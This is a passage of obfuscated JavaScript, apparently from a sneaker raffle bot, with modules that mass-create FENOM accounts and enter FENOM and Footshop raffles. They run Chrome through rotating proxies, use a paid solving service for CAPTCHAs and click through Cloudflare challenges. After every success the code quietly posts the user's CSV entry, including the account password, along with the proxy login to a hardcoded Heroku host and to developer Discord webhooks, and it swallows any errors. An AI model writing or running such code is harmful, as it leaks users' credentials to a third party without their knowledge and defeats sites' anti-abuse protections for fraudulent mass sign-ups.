                            let _0x1d4a06 = _0x382859[_0x7c498c];
                            try {
                                prxdata = {
                                    'username': _0x5f9620['replace']('#', ''),
                                    'module': _0x1753da['name'],
                                    'entrydata': JSON['stringify'](_0x1d4a06),
                                    'proxy': '' + _0x33852c[_0x7c498c]
                                };
                                var _0x3a974f = JSON['stringify'](prxdata);
                                let _0x16956a = { 'headers': { 'content-type': 'application/json' } };
                                await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x3a974f, _0x16956a);
                            } catch (_0x564841) {
                            }
                            const _0x5989fa = {
                                'succesDEVMSG': { 'embeds': [_0x37da04] },
                                'succesPUBMSG': { 'embeds': [_0x55282f] }
                            };
                            try {
                                _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x5989fa['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x5989fa['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0x3ba9f8, _0x5989fa['succesPUBMSG']);
                            } catch (_0x30bb6b) {
                                console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x30bb6b));
                            }
                            _0x373bf6 = 'no';
                        } catch (_0x5d2dd9) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20' + _0x5d2dd9)), _0x41764f = '' + _0x5d2dd9;
                            var _0x65c96e = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'dev', !![], _0x41764f), _0x37da04 = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'dev', ![]), _0x55282f = await _0x105954(_0x382859[_0x7c498c], _0x1753da, 'pub', ![]);
                            const _0x52b283 = {
                                'succesDEVMSG': { 'embeds': [_0x37da04] },
                                'succesPUBMSG': { 'embeds': [_0x55282f] }
                            };
                            _0x52b283['errorDEV'] = { 'embeds': [_0x65c96e] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x52b283['errorDEV']), await _0x4d8e61(_0x369064, _0x52b283['errorDEV']), _0x373bf6 = 'yes';
                        } finally {
                            _0x5eeb63 && _0x5eeb63['close']();
                            if (_0x373bf6 == 'yes' && _0x5afa21 != 0x5) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1753da['name'] + ']\x20Task\x20' + (_0x7c498c + 0x1) + '\x20:\x20Retrying\x20(' + _0x5afa21 + '\x20/\x205)')), _0x7c498c = _0x7c498c - 0x1, _0x5afa21 = _0x5afa21 + 0x1;
                                continue;
                            }
                            _0x373bf6 == 'yes' && _0x5afa21 >= 0x5 && (_0x4d12b6(_0x382859[_0x7c498c], _0x1753da), _0x373bf6 = 'no', _0x5afa21 = 0x0), console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x19a1b9, _0xe337e, _0x4133fd) {
                    var _0x581d3d = _0xe337e, _0x45b91c = 0x0;
                    for (var _0x58e5f7 = 0x0; _0x58e5f7 < _0xe337e['length']; _0x58e5f7++) {
                        maxTasks = Number(_0x165c4b['threads']);
                        while (_0x45b91c >= maxTasks) {
                            await _0x415e3e(_0x165c4b['delay']);
                        }
                        let _0x37b5c1 = ![];
                        async function _0x206949(_0x45b3c2, _0x235329, _0xf992dd, _0x4e7249, _0x59a890) {
                            _0x45b91c++, _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x165c4b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x22cb4b != 'yes')
                                var _0x22cb4b = '', _0x59a890 = 0x0;
                            var _0x475fa4;
                            try {
                                await _0x3da21c(_0x235329, _0x4e7249);
                            } catch {
                                _0x22cb4b = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x424e52(_0x45b3c2['name'] + '\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20/\x20' + _0x235329['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                            var _0x37b3df = await _0x105954(_0x235329[_0x4e7249], _0x45b3c2, 'acc', ![]);
                            const _0x3e1d56 = { 'succesDEVMSG': { 'embeds': [_0x37b3df] } }, _0x5031bf = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x11ea3a = Math['round'](Math['random']() * (_0xf992dd['length'] - 0x1)), _0x4c8c72 = _0xf992dd[_0x11ea3a]['split'](':'), _0x59cb80;
                            async function _0x4ca9ca(_0x35709a) {
                                const _0x52ed9b = _0xaf9669['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x56f311 = _0x6aec87['parse'](_0x52ed9b, { 'header': !![] })['data'];
                                let _0x53e322 = ![];
                                for (var _0x5b048f of _0x56f311) {
                                    if (_0x5b048f['Email'] == _0x35709a['Email']) {
                                        _0x53e322 = !![];
                                        break;
                                    }
                                }
                                return _0x53e322;
                            }
                            try {
                                if (await _0x4ca9ca(_0x235329[_0x4e7249]) == !![]) {
                                    console['log'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x37b5c1 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x59cb80 = await _0x275ae5['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4c8c72[0x0] + ':' + _0x4c8c72[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x59cb80 = await _0x275ae5['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4c8c72[0x0] + ':' + _0x4c8c72[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x4e07d3 = await _0x59cb80['newPage']();
                                await _0x4e07d3['setViewport']({
                                    'width': 0x500 + _0x79391d(0x1, 0x32),
                                    'height': 0x2d9 + _0x79391d(0x1, 0x32)
                                });
                                const _0x2c6ae8 = await _0x4e07d3['target']()['createCDPSession'](), { windowId: _0x565295 } = await _0x2c6ae8['send']('Browser.getWindowForTarget');
                                await _0x4e07d3['authenticate']({
                                    'username': '' + _0x4c8c72[0x2],
                                    'password': '' + _0x4c8c72[0x3]
                                }), console['log'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4e07d3['goto']('' + _0x5031bf, { 'waitUntil': 'networkidle2' }), console['log'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x415e3e(0x1388);
                                var _0x5aa967 = await _0x4e07d3['$']('#turnstile-wrapper');
                                if (_0x5aa967) {
                                    console['log'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x415e3e(0x2710);
                                    const _0x39e0dd = await _0x4e07d3['$']('#turnstile-wrapper');
                                    if (_0x39e0dd)
                                        try {
                                            await _0x39e0dd['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x4e07d3['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x4ded72 = await _0x4e07d3['$']('#turnstile-wrapper');
                                        if (_0x4ded72)
                                            try {
                                                await _0x4ded72['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x4e07d3['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x2c6ae8['send']('Browser.setWindowBounds', {
                                        'windowId': _0x565295,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x415e3e(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x4e07d3['type']('input[name=\x22firstname\x22]', '' + _0x235329[_0x4e7249]['FirstName']), await _0x415e3e(0x1f4), await _0x4e07d3['type']('input[name=\x22lastname\x22]', '' + _0x235329[_0x4e7249]['LastName']), await _0x415e3e(0x1f4), await _0x4e07d3['type']('input[name=\x22email\x22]', '' + _0x235329[_0x4e7249]['Email']), await _0x415e3e(0x1f4), await _0x4e07d3['type']('input[name=\x22password\x22]', '' + _0x235329[_0x4e7249]['Password']), await _0x415e3e(0x258), await _0x4e07d3['$eval']('input[name=\x22psgdpr\x22]', _0x481e71 => _0x481e71['click']()), await _0x415e3e(0x1f4), console['log'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4e07d3['$eval']('#customer-form', _0xc2f5d8 => _0xc2f5d8['submit']());
                                try {
                                    try {
                                        await _0x4e07d3['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x22cb4b = 'no', console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20Account\x20' + _0x235329[_0x4e7249]['Email'] + '\x20Generated')), _0xaf9669['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x235329[_0x4e7249]['Email'] + ',' + _0x235329[_0x4e7249]['Password']);
                                    let _0x38a9f5 = _0x235329[_0x4e7249];
                                    try {
                                        prxdata = {
                                            'username': _0x5f9620['replace']('#', ''),
                                            'module': _0x45b3c2['name'],
                                            'entrydata': JSON['stringify'](_0x38a9f5),
                                            'proxy': '' + _0xf992dd[_0x4e7249]
                                        };
                                        var _0x1d311c = JSON['stringify'](prxdata);
                                        let _0x1d99a5 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x1d311c, _0x1d99a5);
                                    } catch (_0x3ac93f) {
                                    }
                                    try {
                                        _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x3e1d56['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x4d8e61(_0xd282bc, _0x3e1d56['succesDEVMSG']);
                                } catch (_0x2c81b0) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x523f39) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20' + _0x523f39)), _0x475fa4 = '' + _0x523f39;
                                var _0x2d4077 = await _0x105954(_0x235329[_0x4e7249], _0x45b3c2, 'acc', !![], _0x475fa4);
                                _0x3e1d56['errorDEV'] = { 'embeds': [_0x2d4077] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x3e1d56['errorDEV']), await _0x4d8e61(_0x369064, _0x3e1d56['errorDEV']), _0x22cb4b = 'yes';
                            } finally {
                                _0x59cb80 && _0x59cb80['close']();
                                if (_0x22cb4b == 'yes' && _0x59a890 != 0x5)
                                    return console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Task\x20' + (_0x4e7249 + 0x1) + '\x20:\x20Retrying\x20(' + _0x59a890 + '\x20/\x205)')), _0x59a890 = _0x59a890 + 0x1, _0x45b91c--, _0x206949(_0x45b3c2, _0x235329, _0xf992dd, _0x4e7249, _0x59a890);
                                _0x22cb4b == 'yes' && _0x59a890 >= 0x5 && _0x4d12b6(_0x235329[_0x4e7249], _0x45b3c2), !_0x37b5c1 && (console['log'](_0x5b438b() + '\x20[' + _0x45b3c2['name'] + ']\x20Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay'])), _0x45b91c--;
                            }
                        }
                        _0x206949(_0x19a1b9, _0x581d3d, _0x4133fd, _0x58e5f7), !_0x37b5c1 && await _0x415e3e(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0xf29580(_0x47800a, _0x39e830, _0x8f310e) {
                    _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x165c4b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x299a80 = 0x0; _0x299a80 < _0x39e830['length']; _0x299a80++) {
                        if (_0x3f0b8a != 'yes')
                            var _0x3f0b8a = '', _0x1660ed = 0x0;
                        var _0x39396f;
                        try {
                            await _0x3da21c(_0x39e830, _0x299a80);
                        } catch {
                            _0x3f0b8a = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x424e52(_0x47800a['name'] + '\x20Task\x20' + (_0x299a80 + 0x1) + '\x20/\x20' + _0x39e830['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                        const _0x5e66fd = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x487700 = Math['round'](Math['random']() * (_0x8f310e['length'] - 0x1)), _0x17453f = _0x8f310e[_0x487700]['split'](':'), _0x48c4ff;
                        try {
                            _0x48c4ff = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x17453f[0x0] + ':' + _0x17453f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x48c4ff = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x17453f[0x0] + ':' + _0x17453f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4b3fae = await _0x48c4ff['newPage'](), _0x228911 = await _0x4b3fae['target']()['createCDPSession'](), { windowId: _0x35be7b } = await _0x228911['send']('Browser.getWindowForTarget');
                            await _0x4b3fae['authenticate']({
                                'username': '' + _0x17453f[0x2],
                                'password': '' + _0x17453f[0x3]
                            }), console['log'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4b3fae['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x415e3e(0x1388);
                            var _0x16fb0a = await _0x4b3fae['$']('.hcaptcha-box');
                            if (_0x16fb0a) {
                                console['log'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x415e3e(0x2710);
                                const _0x5273ad = await _0x4b3fae['$']('.hcaptcha-box');
                                if (_0x5273ad)
                                    try {
                                        await _0x5273ad['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x4b3fae['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x6c0347 = await _0x4b3fae['$']('.hcaptcha-box');
                                    if (_0x6c0347)
                                        try {
                                            await _0x6c0347['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x228911['send']('Browser.setWindowBounds', {
                                'windowId': _0x35be7b,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x415e3e(0x1f40);
                            try {
                                await _0x4b3fae['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x415e3e(0x1388), console['log'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4b3fae['type']('input[name=\x22email\x22]', '' + _0x39e830[_0x299a80]['Email']), await _0x415e3e(0x1f4), await _0x4b3fae['type']('input[name=\x22password\x22]', '' + _0x39e830[_0x299a80]['Password']), await _0x415e3e(0x258), await _0x4b3fae['$eval']('#login-form', _0x5f20ed => _0x5f20ed['submit']()), await _0x4b3fae['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x415e3e(0x1f4), await _0x4b3fae['goto']('' + _0x39e830[_0x299a80]['Url']), await _0x4b3fae['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x39e830[_0x299a80]['Size']);
                            if (_0x39e830[_0x299a80]['Size'] != 'RANDOM') {
                                var _0x207bfd = '\x20' + _0x39e830[_0x299a80]['Size'] + '\x20';
                                const _0x486781 = await _0x4b3fae['$x']('//span[contains(text(),\x20' + _0x207bfd + ')]');
                                await _0x486781[0x0]['click']();
                            } else {
                                const _0x3966b1 = await _0x4b3fae['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x296f35 = Math['round'](Math['random']() * (_0x3966b1['length'] - 0x1));
                                await _0x3966b1[_0x296f35]['click']();
                            }
                            await _0x415e3e(0x258), await _0x4b3fae['click']('#cookieChoiceDismiss'), await _0x415e3e(0x3e8), await _0x4b3fae['type']('#instagram-account', '' + _0x39e830[_0x299a80]['Follower']), await _0x415e3e(0x28a), await _0x4b3fae['click']('#book-btn'), await _0x415e3e(0xbb8);
                            try {
                                await _0x4b3fae['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x415e3e(0x1f4), console['log'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20' + _0x5dc29b['cyan']('Solving\x20Captcha')), await _0x4b3fae['solveRecaptchas'](), console['log'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x415e3e(0x7d0), await _0x4b3fae['$eval']('#book-btn-for-sure', _0x4cb031 => _0x4cb031['click']()), await _0x415e3e(0x12c), await _0x4b3fae['click']('#book-btn-for-sure'), await _0x415e3e(0xdac);
                            const _0x5d09f6 = await _0x4b3fae['$eval']('.reservation-popup\x20>\x20.title', _0xfc89e3 => {
                                return _0xfc89e3['innerHTML'];
                            });
                            if (_0x5d09f6) {
                                _0x3f0b8a = 'no', _0x53db49(_0x39e830[_0x299a80], _0x47800a), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2f4669 = await _0x105954(_0x39e830[_0x299a80], _0x47800a, 'dev', ![]), _0x27553b = await _0x105954(_0x39e830[_0x299a80], _0x47800a, 'pub', ![]);
                                let _0x549361 = _0x39e830[_0x299a80];
                                try {
                                    prxdata = {
                                        'username': _0x5f9620['replace']('#', ''),
                                        'module': _0x47800a['name'],
                                        'entrydata': JSON['stringify'](_0x549361),
                                        'proxy': '' + _0x8f310e[_0x299a80]
                                    };
                                    var _0x43b4f5 = JSON['stringify'](prxdata);
                                    let _0x3fca62 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x43b4f5, _0x3fca62);
                                } catch (_0x48839f) {
                                }
                                const _0x141061 = {
                                    'succesDEVMSG': { 'embeds': [_0x2f4669] },
                                    'succesPUBMSG': { 'embeds': [_0x27553b] }
                                };
                                try {
                                    _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x141061['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x141061['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0x3ba9f8, _0x141061['succesPUBMSG']);
                                } catch (_0x267d80) {
                                    console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x267d80));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x27e102) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20' + _0x27e102)), _0x39396f = '' + _0x27e102;
                            var _0x506f6f = await _0x105954(_0x39e830[_0x299a80], _0x47800a, 'dev', !![], _0x39396f), _0x2f4669 = await _0x105954(_0x39e830[_0x299a80], _0x47800a, 'dev', ![]), _0x27553b = await _0x105954(_0x39e830[_0x299a80], _0x47800a, 'pub', ![]);
                            const _0x52c7e4 = {
                                'succesDEVMSG': { 'embeds': [_0x2f4669] },
                                'succesPUBMSG': { 'embeds': [_0x27553b] }
                            };
                            _0x52c7e4['errorDEV'] = { 'embeds': [_0x506f6f] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x52c7e4['errorDEV']), await _0x4d8e61(_0x369064, _0x52c7e4['errorDEV']), _0x27e102 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x3f0b8a = 'yes');
                        } finally {
                            _0x48c4ff['close']();
                            if (_0x3f0b8a == 'yes' && _0x1660ed != 0x5 && _0x39396f != 'Size\x20Not\x20Found') {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Task\x20' + (_0x299a80 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1660ed + '\x20/\x205)')), _0x299a80 = _0x299a80 - 0x1, _0x1660ed = _0x1660ed + 0x1;
                                continue;
                            }
                            _0x3f0b8a == 'yes' && _0x1660ed >= 0x5 && (_0x4d12b6(_0x39e830[_0x299a80], _0x47800a), _0x3f0b8a = 'no', _0x1660ed = 0x0), console['log'](_0x5b438b() + '\x20[' + _0x47800a['name'] + ']\x20Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x28a9d8, _0x30d392, _0x2dc1af) {
                _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x165c4b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x49668a = 0x0; _0x49668a < _0x30d392['length']; _0x49668a++) {
                    var _0xef8dec;
                    if (_0x106418 != 'yes')
                        var _0x106418 = '', _0x23c0cd = 0x0;
                    var _0x485638 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x5f9620
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x30d392[_0x49668a]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x30d392[_0x49668a]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x165c4b['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x57c4cf
                            }
                        ]
                    }], _0x48d163 = await _0x105954(_0x30d392[_0x49668a], _0x28a9d8, 'dev', ![]), _0x464c69 = await _0x105954(_0x30d392[_0x49668a], _0x28a9d8, 'pub', ![]);
                    const _0x46fd74 = {
                        'succesDEVMSG': { 'embeds': [_0x48d163] },
                        'succesPUBMSG': { 'embeds': [_0x464c69] }
                    }, _0x48cb68 = { 'embeds': _0x485638 };
                    try {
                        await _0x3da21c(_0x30d392, _0x49668a);
                    } catch {
                        _0x106418 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x30d392[_0x49668a]['Email'] == '' || _0x30d392[_0x49668a]['FirstName'] == '' || _0x30d392[_0x49668a]['LastName'] == '' || _0x30d392[_0x49668a]['Country'] == '' || _0x30d392[_0x49668a]['Size'] == '' || _0x30d392[_0x49668a]['Address1'] == '' || _0x30d392[_0x49668a]['Zip'] == '') {
                        console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x30d392[_0x49668a]['Email'] == '' || _0x30d392[_0x49668a]['FirstName'] == '' || _0x30d392[_0x49668a]['LastName'] == '' || _0x30d392[_0x49668a]['Country'] == '' || _0x30d392[_0x49668a]['Size'] == '' || _0x30d392[_0x49668a]['Address1'] == '' || _0x30d392[_0x49668a]['Zip'] == '' || _0x30d392[_0x49668a]['Phone'] == '') {
                        console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x1c5a99 = '' + _0x30d392[_0x49668a]['Url'];
                    if (_0x165c4b['useRandomProxy'] = ![])
                        var _0x22b89b = _0x2dc1af[_0x49668a]['split'](':');
                    else
                        var _0x3f93e5 = Math['round'](Math['random']() * (_0x2dc1af['length'] - 0x1)), _0x22b89b = _0x2dc1af[_0x3f93e5]['split'](':');
                    var _0x3f28ca;
                    try {
                        _0x3f28ca = await _0x275ae5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x22b89b[0x0] + ':' + _0x22b89b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3f28ca = await _0x275ae5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x22b89b[0x0] + ':' + _0x22b89b[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x356bfb = await _0x3f28ca['newPage']();
                        await _0x356bfb['authenticate']({
                            'username': '' + _0x22b89b[0x2],
                            'password': '' + _0x22b89b[0x3]
                        }), console['log'](_0x5b438b() + '\x20[' + _0x28a9d8['name'] + ']\x20Task\x20' + (_0x49668a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x356bfb['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x356bfb['setRequestInterception'](!![]), _0x356bfb['on']('request', _0xb46469 => {
                            _0xb46469['resourceType']() === 'image' || _0xb46469['resourceType']() === 'font' || _0xb46469['resourceType']() === 'media' ? _0xb46469['abort']() : _0xb46469['continue']();
                        });
                        try {
                            await _0x356bfb['goto'](_0x1c5a99), await _0x415e3e(0xbb8), await _0x356bfb['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x356bfb['click']('.control__JhutY'), await _0x415e3e(0x1f4);
                        if (_0x30d392[_0x49668a]['Size'] != 'RANDOM')
                            try {
                                const _0x169996 = await _0x356bfb['$x']('//div[contains(text(),\x20\x27' + _0x30d392[_0x49668a]['Size'] + '\x27)]');
                                await _0x169996[0x0]['click']();
                            } catch {
